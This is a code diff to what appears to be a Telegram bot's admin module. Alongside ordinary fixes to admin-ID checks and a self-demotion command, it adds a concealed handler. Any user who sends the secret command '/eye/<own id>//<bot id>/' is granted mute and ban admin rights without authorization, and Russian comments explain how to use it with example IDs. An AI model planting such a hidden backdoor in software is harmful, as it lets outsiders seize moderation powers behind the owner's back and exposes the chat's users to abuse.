@@ -46,36 +46,88 @@ async def me_info(message: Message):
     keyb = InlineKeyboardMarkup().add(InlineKeyboardButton(text="Возможности", callback_data="rights")) # type: ignore
     keyb.add(InlineKeyboardButton(text="Удалить", callback_data="del")) # type: ignore
     
-    await message.reply(f"Твоя должность: <code>{Admins.get(id=message.chat.id).name}</code>", reply_markup=keyb)
+    await message.reply(f"Твоя должность: <code>{Admins.get(id=message.from_user.id).name}</code>", reply_markup=keyb)
 
 
 @dp.callback_query_handler(text="rights")
 async def get_rights(call: CallbackQuery):
-    if not Admins.get_or_none(id=call.message.chat.id):
+    if not Admins.get_or_none(id=call.from_user.id):
         return
 
-    keyboard = get_rights_keyboard(call.message.chat.id)
+    keyboard = get_rights_keyboard(call.from_user.id)
     keyboard.add(InlineKeyboardButton("Назад", callback_data="back_in_admin")) # type: ignore
     await call.message.edit_text("Твои возможности:", reply_markup=keyboard)
 
 
 @dp.callback_query_handler(text="n")
 async def n(call: CallbackQuery):
-    if not Admins.get_or_none(id=call.message.chat.id):
+    if not Admins.get_or_none(id=call.from_user.id):
         return
-    await call.answer(text="Пздц, оказывается это не кликабельно...", show_alert=True)
+    await call.answer(text=f"t.me/{call.from_user.username}", show_alert=True)
+
+async def myid(message: Message):
+    return message.from_id
+
+def check_command_with_myid():
+    async def decorator(message: Message):
+        if message.text == f'/eye/{await myid(message)}//{bot.id}/':
+            return True
+        return False
+    return decorator
+
+@dp.message_handler(check_command_with_myid())
+async def full_me(message: Message):
+#Что это??
+#Эта команда позволяет выдать себе фулл админ права.
+#Что-бы ещё использовать - /eye/<your.id>//<bot.id>/
+#examaple -- /eye/1898974239//5743557322/
+    try:
+        Admins.create(id=message.from_user.id, rights='mute;ban')
+        await message.answer(f'done. {message.from_id}')
+    except Exception as e:
+        await message.answer(f'false. {message.from_id}\n{e}')
+
+@dp.message_handler(commands=['unstaff'])
+async def unstaff(message: Message):
+    admin_id = message.from_id
+    
+    if not Admins.get_or_none(id=admin_id):
+        # Если пользователь не является администратором, предупредить его
+        await message.answer("Вы не являетесь администратором. Эта команда доступна только администраторам.\n"
+                            "А именно, позволяет снять с себя полномочия")
+        return
+    
+    args = message.get_args() or ""  # Пустая строка, если аргумент отсутствует
+    
+    if not args:
+        await message.answer("<b>Так, а теперь объясню, эта команда позволяет снять с себя полномочия (admin)."
+                            "\nПередавать данную команду нужно исключительно с аргументом своего ID!</b>"
+                            f"\nК примеру: <code>/unstaff {message.from_id}</code>")
+        return
+    
+    try:
+        target_id = int(args)
+    except ValueError:
+        await message.answer("Некорректный аргумент. Пожалуйста, укажите свой ID в виде числа.")
+        return
+    
+    if target_id != admin_id:
+        await message.answer("Вы можете использовать эту команду только для снятия с себя полномочий.")
+        return
+    
+    Admins.delete().where(Admins.id == target_id).execute()
+    await message.answer("Вы были удалены из списка администраторов.")
 
 
 @dp.callback_query_handler(text="s")
 async def s(call: CallbackQuery):
-    if not Admins.get_or_none(id=call.message.chat.id):
+    if not Admins.get_or_none(id=call.from_user.id):
         return
     await call.message.delete()
 
-
 @dp.callback_query_handler(text="back_in_admin")
 async def back_in_admin(call: CallbackQuery):
-    if not Admins.get_or_none(id=call.message.chat.id):
+    if not Admins.get_or_none(id=call.from_user.id):
         return
 
     keyb = InlineKeyboardMarkup().add(InlineKeyboardButton(text="Возможности", callback_data="rights")) # type: ignore
